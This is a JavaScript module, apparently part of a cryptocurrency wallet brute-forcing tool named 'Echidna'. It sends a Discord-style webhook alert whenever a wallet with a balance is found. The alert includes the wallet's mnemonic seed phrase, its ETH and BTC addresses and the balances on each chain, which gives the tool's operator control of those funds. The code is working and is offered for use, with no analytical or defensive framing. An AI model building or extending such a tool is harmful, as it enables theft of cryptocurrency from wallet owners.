/**
 * Echidna - Notifier
 * Send notifications when wallets with balance are found
 */

import axios from 'axios';
import { config } from './config.js';

export class Notifier {
  async sendHit(wallet, balances, stats) {
    if (!config.webhookUrl) {
      console.log('⚠️  No webhook URL configured, skipping notification');
      return;
    }

    const balanceInfo = balances
      .filter(b => b.hasBalance)
      .map(b => `**${b.chain}**: ${b.balance} ${b.symbol}`)
      .join('\n');

    const message = {
      embeds: [{
        title: '🎉 ECHIDNA HIT - Wallet Found!',
        description: 'A wallet with balance has been discovered!',
        color: 0x9b59b6, // Purple for Echidna
        fields: [
          {
            name: '💰 Balances',
            value: balanceInfo,
            inline: false,
          },
          {
            name: '🔑 Mnemonic',
            value: `\`\`\`${wallet.mnemonic}\`\`\``,
            inline: false,
          },
          {
            name: '📊 Stats',
            value: `Total Checked: ${stats.totalWallets}\nTotal Hits: ${stats.totalHits}`,
            inline: false,
          },
          {
            name: '📍 Addresses',
            value: `ETH: \`${wallet.addresses.ethereum}\`\nBTC: \`${wallet.addresses.bitcoin}\``,
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
        footer: {
          text: 'Echidna - The Witch of Greed',
        },
      }],
    };

    try {
      await axios.post(config.webhookUrl, message);
      console.log('✅ Notification sent successfully');
    } catch (error) {
      console.error('❌ Failed to send notification:', error.message);
    }
  }
}
